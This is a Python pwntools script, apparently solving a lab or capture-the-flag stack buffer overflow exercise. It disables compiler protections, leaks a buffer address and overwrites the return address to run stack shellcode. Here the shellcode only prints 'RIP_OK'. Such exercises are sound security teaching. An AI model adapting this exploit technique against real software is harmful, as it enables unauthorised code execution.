from pwn import asm, p64, context
import subprocess, re

# Buffer overflow etapa 2: saltar o retorno para o proprio buffer (shellcode na pilha).
context.arch = "amd64"
context.log_level = "error"

subprocess.run(["gcc", "-O0", "-fno-stack-protector", "-no-pie", "-z", "execstack",
                "/challenge/vuln.c", "-o", "/tmp/vuln"], check=True)

# placeholder: o leak precisa usar o mesmo argv[1] que o check usa
open("/home/hacker/payload.bin", "wb").write(b"\x90" * 8)
leak = subprocess.run(["/tmp/vuln", "/home/hacker/payload.bin"],
                      capture_output=True).stderr.decode()
buf = int(re.search(r"buf = (0x[0-9a-f]+)", leak).group(1), 16)

shellcode = asm('''
    mov eax, 1
    mov edi, 1
    lea rsi, [rip + message]
    mov edx, 7
    syscall
    mov eax, 60
    xor edi, edi
    syscall
message:
    .ascii "RIP_OK\\n"
''')

offset = 136
payload = shellcode + b"\x90" * (offset - len(shellcode)) + p64(buf)
open("/home/hacker/payload.bin", "wb").write(payload)
